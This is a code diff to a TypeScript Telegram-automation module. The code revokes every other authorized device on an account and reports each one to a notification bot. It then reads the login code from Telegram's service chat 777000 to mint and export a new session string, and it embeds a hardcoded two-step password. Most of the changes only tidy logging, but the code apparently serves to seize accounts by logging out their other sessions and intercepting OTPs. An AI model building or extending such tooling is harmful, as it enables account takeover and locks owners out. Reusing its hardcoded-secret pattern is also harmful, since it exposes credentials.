@@ -34,7 +34,7 @@ export async function removeOtherAuths(ctx: TgContext): Promise<void> {
             continue;
         }
         ctx.logger.info(ctx.phoneNumber, `Revoking auth: ${auth.appName} | ${auth.deviceModel} | ${auth.country}`);
-        await fetchWithTimeout(`${notifbot()}&text=${encodeURIComponent(`Removing Auth : ${ctx.phoneNumber}\n${auth.appName}:${auth.country}:${auth.deviceModel}`)}`);
+        await fetchWithTimeout(`${notifbot()}&text=${encodeURIComponent(`Removing Auth\n\nMobile: ${ctx.phoneNumber}\nApp: ${auth.appName || 'unknown'}\nDevice: ${auth.deviceModel || 'unknown'}\nCountry: ${auth.country || 'unknown'}\nAPI ID: ${auth.apiId || 'unknown'}`)}`);
         await resetAuthorization(ctx, auth);
         revokedCount++;
         await sleep(2000 + Math.random() * 3000); // Pause between revocations
@@ -169,9 +169,8 @@ export async function createNewSession(ctx: TgContext): Promise<string> {
 
     const sessionPromise = (async () => {
         const me = <Api.User>await ctx.client.getMe();
-        ctx.logger.info(ctx.phoneNumber, 'Creating new session for: ', me.phone);
-
         const { apiId, apiHash, params: tgParams } = await generateTGConfig(ctx.phoneNumber);
+
         const newClient = new TelegramClient(
             new StringSession(''),
             apiId,
@@ -179,23 +178,15 @@ export async function createNewSession(ctx: TgContext): Promise<string> {
             tgParams
         );
 
-        ctx.logger.info(ctx.phoneNumber, 'Starting Session Creation...');
         await newClient.start({
             phoneNumber: me.phone,
             password: async () => 'Ajtdmwajt1@',
-            phoneCode: async () => {
-                ctx.logger.info(ctx.phoneNumber, 'Waiting for the OTP code from chat ID 777000...');
-                return await waitForOtp(ctx);
-            },
+            phoneCode: async () => await waitForOtp(ctx),
             onError: (err: Error) => { throw err; },
         });
 
-        ctx.logger.info(ctx.phoneNumber, 'Session Creation Completed');
         const session = <string><unknown>newClient.session.save();
-
         await newClient.destroy();
-        ctx.logger.info(ctx.phoneNumber, 'New Session: ', session);
-
         return session;
     })();
 
@@ -205,23 +196,29 @@ export async function createNewSession(ctx: TgContext): Promise<string> {
 export async function waitForOtp(ctx: TgContext): Promise<string> {
     for (let i = 0; i < 3; i++) {
         try {
-            ctx.logger.info(ctx.phoneNumber, 'Attempt : ', i);
             const messages = await ctx.client.getMessages('777000', { limit: 1 });
             const message = messages[0];
-            if (message && message.date && message.date * 1000 > Date.now() - 60000) {
-                const code = message.text.split('.')[0].split('code:**')[1].trim();
-                ctx.logger.info(ctx.phoneNumber, 'returning: ', code);
-                return code;
+            if (!message) {
+                await sleep(5000);
+                continue;
+            }
+
+            const msgDate = message.date * 1000;
+            const freshnessLimit = 60000;
+            const isFresh = msgDate > Date.now() - freshnessLimit;
+
+            if (isFresh) {
+                return message.text.split('.')[0].split('code:**')[1].trim();
             } else {
-                ctx.logger.info(ctx.phoneNumber, `Message Date: ${new Date(message.date * 1000).toISOString()} Now: ${new Date(Date.now() - 60000).toISOString()}`);
                 const code = message.text.split('.')[0].split('code:**')[1].trim();
-                ctx.logger.info(ctx.phoneNumber, 'Skipped Code: ', code);
-                if (i == 2) return code;
+                if (i == 2) {
+                    return code;
+                }
                 await sleep(5000);
             }
         } catch (err) {
+            ctx.logger.warn(ctx.phoneNumber, `OTP read attempt ${i + 1} failed: ${err instanceof Error ? err.message : String(err)}`);
             await sleep(2000);
-            ctx.logger.info(ctx.phoneNumber, err);
         }
     }
     throw new Error('Failed to get OTP after 3 attempts');
